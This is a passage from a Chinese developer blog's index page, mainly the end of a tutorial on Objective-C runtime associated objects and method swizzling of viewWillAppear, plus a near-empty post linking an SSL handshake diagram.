key</code>关联对象唯一的key，获取时会用到。</li><br>    <li><code>id value</code>关联对象。</li><br>    <li><code>objc_AssociationPolicy</code>关联策略，有以下几种策略：</li><br></ol><br><pre><code>enum {<br>    OBJC_ASSOCIATION_ASSIGN = 0,<br>    OBJC_ASSOCIATION_RETAIN_NONATOMIC = 1,<br>    OBJC_ASSOCIATION_COPY_NONATOMIC = 3,<br>    OBJC_ASSOCIATION_RETAIN = 01401,<br>    OBJC_ASSOCIATION_COPY = 01403<br>};</code></pre><br>如果你熟悉OC，看名字应该知道这几种策略的意思了吧。<br><br><code>objc_getAssociatedObject</code>的两个参数。<br><ol><br>    <li><code>id object</code>获取谁的关联对象。</li><br>    <li><code>const void *key</code>根据这个唯一的key获取关联对象。</li><br></ol><br>其实，你还可以把添加和获取关联对象的方法写在你需要用到这个功能的类的类别中，方便使用。<br><pre><code>//添加关联对象<br>- (void)addAssociatedObject:(id)object{<br>    objc_setAssociatedObject(self, @selector(getAssociatedObject), object, OBJC_ASSOCIATION_RETAIN_NONATOMIC);<br>}<br>//获取关联对象<br>- (id)getAssociatedObject{<br>    return objc_getAssociatedObject(self, _cmd);<br>}</code></pre><br><strong>注意：</strong>这里面我们把<code>getAssociatedObject</code>方法的地址作为唯一的key，<code>_cmd</code>代表当前调用方法的地址。<br><h2>方法交换</h2><br>方法交换，顾名思义，就是将两个方法的实现交换。例如，将A方法和B方法交换，调用A方法的时候，就会执行B方法中的代码，反之亦然。<br>话不多说，这是参考Mattt大神在NSHipster上的文章自己写的代码。<br><pre><code>#import “UIViewController+swizzling.h”<br>#import &lt;objc/runtime.h&gt;<br><br>@implementation UIViewController (swizzling)<br><br>//load方法会在类第一次加载的时候被调用<br>//调用的时间比较靠前，适合在这个方法里做方法交换<br>+ (void)load{<br>    //方法交换应该被保证，在程序中只会执行一次<br>    static dispatch_once_t onceToken;<br>    dispatch_once(&amp;onceToken, ^{<br><br>        //获得viewController的生命周期方法的selector<br>        SEL systemSel = @selector(viewWillAppear:);<br>        //自己实现的将要被交换的方法的selector<br>        SEL swizzSel = @selector(swiz_viewWillAppear:);<br>        //两个方法的Method<br>        Method systemMethod = class_getInstanceMethod([self class], systemSel);<br>        Method swizzMethod = class_getInstanceMethod([self class], swizzSel);<br><br>        //首先动态添加方法，实现是被交换的方法，返回值表示添加成功还是失败<br>        BOOL isAdd = class_addMethod(self, systemSel, method_getImplementation(swizzMethod), method_getTypeEncoding(swizzMethod));<br>        if (isAdd) {<br>            //如果成功，说明类中不存在这个方法的实现<br>            //将被交换方法的实现替换到这个并不存在的实现<br>            class_replaceMethod(self, swizzSel, method_getImplementation(systemMethod), method_getTypeEncoding(systemMethod));<br>        }else{<br>            //否则，交换两个方法的实现<br>            method_exchangeImplementations(systemMethod, swizzMethod);<br>        }<br><br>    });<br>}<br><br>- (void)swiz_viewWillAppear:(BOOL)animated{<br>    //这时候调用自己，看起来像是死循环<br>    //但是其实自己的实现已经被替换了<br>    [self swiz_viewWillAppear:animated];<br>    NSLog(@”swizzle”);<br>}<br><br>@end</code></pre><br>在一个自己定义的viewController中重写viewWillAppear<br><pre><code>- (void)viewWillAppear:(BOOL)animated{<br>    [super viewWillAppear:animated];<br>    NSLog(@”viewWillAppear”);<br>}</code></pre><br>Run起来看看输出吧！<br><br><strong>我的理解：</strong><br><ul><br>    <li>方法交换对于我来说更像是实现一种思想的最佳技术：AOP面向切面编程。</li><br>    <li>既然是切面，就一定不要忘记，交换完再调回自己。</li><br>    <li>一定要保证只交换一次，否则就会很乱。</li><br>    <li>最后，据说这个技术很危险，谨慎使用。</li><br></ul><br><h3>完</h3><br></div>
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2015/08/13/iOS-runtime理解/" class="archive-article-date">
  	<time datetime="2015-08-13T02:59:49.000Z" itemprop="datePublished"><i class="icon-clock"></i>2015-08-13</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/iOS/">iOS</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-SSL握手" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/04/06/SSL握手/">SSL握手</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="http://img.pickbox.me/wp-content/uploads/SSL_handshake_with_two_way_authentication_with_certificates.svg" target="_blank" rel="external"><img class="alignnone size-large wp-image-1174" alt="SSL_handshake_with_two_way_authentication_with_certificates" src="http://img.pickbox.me/wp-content/uploads/SSL_handshake_with_two_way_authentication_with_certificates.svg"></a></p>

      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2015/04/06/SSL握手/" class="archive-article-date">
  	<time datetime="2015-04-06T02:38:28.000Z" itemprop="datePublished"><i class="icon-clock"></i>2015-04-06</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Network/">Network</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/60/">60</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  


      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 jfo
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    <script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		root: "/",
		innerArchive: true
	}
</script>

<script src="/./main.js"></script>


    
<div class="tools-col">
  <ul class="btn-wrap">
    
      <li class="chose" data-hook="tools-section-all"><span class="text">全部</span><i class="icon-book"></i></li>
    
    
      <li data-hook="tools-section-tag"><span class="text">标签</span><i class="icon-price-tags"></i></li>
    
    
      <li data-hook="tools-section-friends"><span class="text">友链</span><i class="icon-link"></i></li>
    
    
      <li data-hook="tools-section-me"><span class="text">我</span><i class="icon-smile"></i></li>
    
  </ul>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all chose">
    	</section>
    

    
    	<section class="tools-section tools-section-tag">
    			<div class="widget tagcloud" id="js-tagcloud">
    				<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">87</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Arduino-OpenWrt/">Arduino/OpenWrt</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DefaultCategory/">DefaultCategory</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Distributed-Computing/">Distributed Computing</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/English/">English</a><span class="category-list-count">20</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Google/">Google</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Life/">Life</a><span class="category-list-count">67</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">52</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-App/">Linux App</a><span class="category-list-count">61</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Debug/">Linux Debug</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Virtualization/">Linux Virtualization</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mac-OS-X/">Mac OS X</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mobile/">Mobile</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Network/">Network</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Saying/">Saying</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WebDev/">WebDev</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/">Windows</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/c-c-template-gp-boost/">c++/c++ template/gp/boost</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/c-c-algorithm/">c/c++/algorithm</a><span class="category-list-count">36</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cocos2d-x-模拟器/">cocos2d-x/模拟器</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/com组件/">com组件</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/framework/">framework</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/gcc-binutils-make-共享库/">gcc/binutils/make/共享库</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/iOS/">iOS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/js-html-python/">js/html/python</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/l4ka-pistachio-iguana/">l4ka::pistachio/iguana</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux-图形/">linux 图形</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python-js-php-html-mysql-http/">python/js/php/html/mysql/http</a><span class="category-list-count">46</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reading/">reading</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/self-collect/">self_collect</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/unifiedkernel-wine-reactos/">unifiedkernel/wine/reactos</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wordpress/">wordpress</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/产品/">产品</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/教育/">教育</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/数学-物理/">数学/物理</a><span class="category-list-count">3</span></li></ul>
    			</div>
    	</section>
    

    
    	<section class="tools-section tools-section-friends">
  		
  			<div class="friends-wrap" id="js-friends">
  			
  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://iguangba.pickbox.me/">爱逛吧</a>
  	        
  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pickbox.me/">收藏夹</a>
  	        
  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://note.pickbox.me/">网络剪贴板</a>
  	        
  	        </div>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me">
  	  	
  	  		<div class="aboutme-wrap" id="js-aboutme">jfojfo#gmail.com</div>
  	  	
    	</section>
    
  </div>
  
</div>

    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>